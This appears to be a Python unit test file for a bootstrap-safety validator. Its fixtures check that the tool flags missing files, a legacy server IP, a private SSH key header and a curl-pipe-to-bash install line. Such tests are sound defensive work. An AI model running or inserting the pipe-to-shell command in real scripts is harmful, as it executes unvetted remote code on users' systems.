"""Offline unit tests: python3 -m unittest discover -s openclaw/tests -v"""
from pathlib import Path
import tempfile
import unittest
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools"))
from validate_bootstrap import check, REQUIRED


class BootstrapSafetyTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        for rel in REQUIRED:
            target = self.root / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text("placeholder\n", encoding="utf-8")

    def test_clean_fixture_passes(self):
        self.assertEqual(check(self.root), [])

    def test_missing_file_fails(self):
        (self.root / REQUIRED[0]).unlink()
        self.assertTrue(any("missing required file" in x for x in check(self.root)))

    def test_legacy_ip_in_script_fails(self):
        (self.root / "scripts/preflight.sh").write_text("ssh user@95.179.138.254\n")
        self.assertTrue(any("legacy Vultr IP" in x for x in check(self.root)))

    def test_private_key_in_config_fails(self):
        (self.root / "config.yml").write_text("-----BEGIN OPENSSH PRIVATE KEY-----\n")
        self.assertTrue(any("private SSH key" in x for x in check(self.root)))

    def test_unsafe_pipe_to_shell_fails(self):
        (self.root / "scripts/preflight.sh").write_text("curl https://example.invalid/i.sh | bash\n")
        self.assertTrue(any("automatic install execution" in x for x in check(self.root)))


if __name__ == "__main__":
    unittest.main()
